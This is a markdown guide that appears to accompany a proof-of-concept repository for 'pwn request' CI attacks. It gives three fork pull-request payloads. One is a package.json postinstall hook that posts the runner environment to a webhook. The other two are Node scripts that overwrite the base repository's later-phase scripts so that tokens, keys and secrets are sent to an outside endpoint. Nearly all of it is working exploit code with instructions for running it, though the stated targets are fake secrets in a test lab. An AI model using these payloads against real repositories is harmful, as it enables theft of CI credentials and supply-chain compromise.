# Attack payload examples

Three fork-PR payloads of increasing sophistication. Each goes in the attacker's fork — not the base repo. Replace `https://webhook.site/YOUR-UUID-HERE` with your own exfil endpoint.

Each payload is applied by editing the `package.json` on your fork's branch and opening a PR against `not-a-rootkit/pwn-request-poc:main`.

---

## Variant A — Naive env dump (captures Phase 1 only)

**Expected result:** your webhook receives ambient runner env. Neither `FAKE_PHASE2_TOKEN` nor `FAKE_PHASE3_KEY` is present.

Replace `package.json` on your fork with:

```json
{
  "name": "pwn-request-poc",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -sS -X POST -H 'content-type: application/json' --data \"$(env | jq -Rs . 2>/dev/null || env | sed 's/\"/\\\\\"/g' | awk '{printf \"%s\\\\n\", $0}')\" https://webhook.site/YOUR-UUID-HERE || true"
  }
}
```

This is the category of payload that every observed content-scope-scripts exploit PR used. It confirms RCE but captures no repo secrets.

---

## Variant B — Hijack Phase 2 (captures `FAKE_PHASE2_TOKEN`)

**Expected result:** your webhook receives `FAKE_PHASE2_TOKEN` via a hijacked `phase2-analyze.mjs`.

`package.json`:

```json
{
  "name": "pwn-request-poc",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./poc-install.js"
  }
}
```

Add a new file `poc-install.js` to the fork:

```js
// Runs during Phase 1 (cwd is pr/). Rewrite the sibling base/ script that
// Phase 2 will execute.
const fs = require('fs');
const path = require('path');

const victim = path.resolve(process.cwd(), '..', 'base', 'scripts', 'phase2-analyze.mjs');

const payload = `
import https from 'node:https';
const url = new URL('https://webhook.site/YOUR-UUID-HERE');
const body = JSON.stringify({
  phase: 2,
  env: Object.fromEntries(Object.entries(process.env).filter(([k]) =>
    /FAKE_|TOKEN|KEY|SECRET/i.test(k)
  )),
});
const req = https.request({
  method: 'POST',
  hostname: url.hostname,
  path: url.pathname + url.search,
  headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
});
req.on('error', () => {});
req.write(body);
req.end();
console.log('[phase2-analyze] hijacked');
`;

try {
  fs.mkdirSync(path.dirname(victim), { recursive: true });
  fs.writeFileSync(victim, payload);
  console.log('[poc-install] overwrote', victim);
} catch (e) {
  console.log('[poc-install] failed:', e.message);
}
```

Also add a `package-lock.json` or skip it — npm install will still run postinstall either way (without `--ignore-scripts`).

---

## Variant C — Hijack Phase 2 and Phase 3 (captures both secrets)

Same shape as Variant B, but overwrite both base scripts. Each callback arrives from its respective step.

`poc-install.js`:

```js
const fs = require('fs');
const path = require('path');

const basePath = path.resolve(process.cwd(), '..', 'base', 'scripts');

const makePayload = (phase) => `
import https from 'node:https';
const url = new URL('https://webhook.site/YOUR-UUID-HERE');
const body = JSON.stringify({
  phase: ${phase},
  env: Object.fromEntries(Object.entries(process.env).filter(([k]) =>
    /FAKE_|TOKEN|KEY|SECRET/i.test(k)
  )),
});
const req = https.request({
  method: 'POST',
  hostname: url.hostname,
  path: url.pathname + url.search,
  headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
});
req.on('error', () => {});
req.write(body);
req.end();
console.log('[phase${phase}] hijacked');
`;

try {
  fs.mkdirSync(basePath, { recursive: true });
  fs.writeFileSync(path.join(basePath, 'phase2-analyze.mjs'), makePayload(2));
  fs.writeFileSync(path.join(basePath, 'phase3-publish.mjs'), makePayload(3));
  console.log('[poc-install] hijacked both scripts');
} catch (e) {
  console.log('[poc-install] failed:', e.message);
}
```

**Expected result:** two webhook callbacks — one labelled `phase: 2` containing `FAKE_PHASE2_TOKEN`, one labelled `phase: 3` containing `FAKE_PHASE3_KEY`. `FAKE_PHASE2_TOKEN` will NOT appear in the phase-3 callback (step-scoped env).

---

## What each variant proves

| Variant | Proves | Matches which real-world PRs |
|---------|--------|-----------------------------|
| A | RCE on runner at postinstall, but step-scoped secrets are not reachable via naive env dump | content-scope-scripts #2426, #2656, #2657, #2658 — every observed exploit |
| B | Cross-directory file rewrite during Phase 1 lets attacker steal a Phase-2 secret | none observed (the theoretical path) |
| C | Multiple secrets in different steps can all be captured with a single PR | none observed |

Run Variant A first to confirm the baseline (nothing leaks), then B and C to confirm the file-hijack path works as expected.
